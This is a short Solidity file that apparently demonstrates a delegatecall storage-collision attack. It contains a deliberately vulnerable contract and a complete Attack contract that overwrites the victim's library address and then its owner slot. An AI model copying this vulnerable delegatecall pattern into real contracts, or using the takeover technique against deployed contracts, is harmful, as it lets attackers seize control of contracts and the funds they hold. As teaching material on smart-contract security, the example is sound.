// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Lib {
    uint256 public num;
    
    function setNum(uint256 _num) public {
        num = _num;
    }
}

contract DelegateControl {
    address public lib;
    address public owner;
    
    constructor(address _lib) {
        owner = msg.sender;
        lib = _lib;
    }

    function doSomething(uint256 _num) public {
        (bool res, ) = lib.delegatecall(abi.encodeWithSignature('setNum(uint256)', _num));
        require(res == true, "delegatecall failed");
    }
}

contract Attack {
    address public lib;
    address public master;

    DelegateControl public delegate;

    constructor(address _delegate) {
        delegate = DelegateControl(_delegate);
    }

    function changeYourOwner() public {
        /// change DelegateControl's lib to contract Attack address
        delegate.doSomething(uint256(uint160(address(this))));

        /// using Attack's doSomething to change owner at slot1
        delegate.doSomething(1);
    }

    /// @dev keeping Attack's setNum func the same as Lib's setNum func
    /// @notice using it to change storage variable at slot1
    /// @param _num just a decoration
    function setNum(uint256 _num) public {
        master = msg.sender;
    }

    /// @dev same use if don't have setNum
    // fallback() external {
    //     master = msg.sender;
    // }
}